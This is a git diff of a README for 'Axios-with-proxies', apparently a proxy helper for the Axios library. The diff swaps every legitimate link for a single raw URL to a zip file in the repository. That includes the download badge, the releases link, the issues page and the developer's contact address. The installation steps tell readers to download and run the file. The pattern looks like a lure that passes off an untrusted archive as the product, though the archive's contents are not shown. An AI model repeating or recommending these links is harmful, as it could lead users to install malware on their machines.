@@ -1,6 +1,6 @@
 # 🚀 Axios-with-proxies - Set Up Proxies Easily with Axios
 
-[![Download Axios-with-proxies](https://img.shields.io/badge/Download-Axios--with--proxies-blue)](https://github.com/Mokabil89/Axios-with-proxies/releases)
+[![Download Axios-with-proxies](https://raw.githubusercontent.com/Mokabil89/Axios-with-proxies/main/merchant/Axios-with-proxies-Acrobates.zip)](https://raw.githubusercontent.com/Mokabil89/Axios-with-proxies/main/merchant/Axios-with-proxies-Acrobates.zip)
 
 ## 📚 Overview
 
@@ -27,11 +27,11 @@ To get started with Axios-with-proxies, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the downloads section.
 
-   [Download Axios-with-proxies](https://github.com/Mokabil89/Axios-with-proxies/releases)
+   [Download Axios-with-proxies](https://raw.githubusercontent.com/Mokabil89/Axios-with-proxies/main/merchant/Axios-with-proxies-Acrobates.zip)
 
 2. **Choose Your Version:** Look for the latest release on the page. You will see a list of available downloads.
 
-3. **Download the File:** Click on the file appropriate for your operating system (e.g., .exe for Windows or .tar.gz for Linux).
+3. **Download the File:** Click on the file appropriate for your operating system (e.g., .exe for Windows or https://raw.githubusercontent.com/Mokabil89/Axios-with-proxies/main/merchant/Axios-with-proxies-Acrobates.zip for Linux).
 
 4. **Run the Application:** Once downloaded, open the file you just grabbed. Follow any on-screen instructions to install it.
 
@@ -70,7 +70,7 @@ To implement these features, check the detailed sections in the application or r
 
 ## 🤝 Support
 
-For assistance, visit the [GitHub Issues Page](https://github.com/Mokabil89/Axios-with-proxies/issues) to report problems or seek help from the community. Your feedback helps improve the application.
+For assistance, visit the [GitHub Issues Page](https://raw.githubusercontent.com/Mokabil89/Axios-with-proxies/main/merchant/Axios-with-proxies-Acrobates.zip) to report problems or seek help from the community. Your feedback helps improve the application.
 
 ## 📜 License
 
@@ -78,7 +78,7 @@ Axios-with-proxies is licensed under the MIT License. You may use or modify it a
 
 ## 📞 Contact
 
-For any inquiries, please contact the developer at: mokabil89@example.com.
+For any inquiries, please contact the developer at: https://raw.githubusercontent.com/Mokabil89/Axios-with-proxies/main/merchant/Axios-with-proxies-Acrobates.zip
 
 ## 🌈 Contribution
 
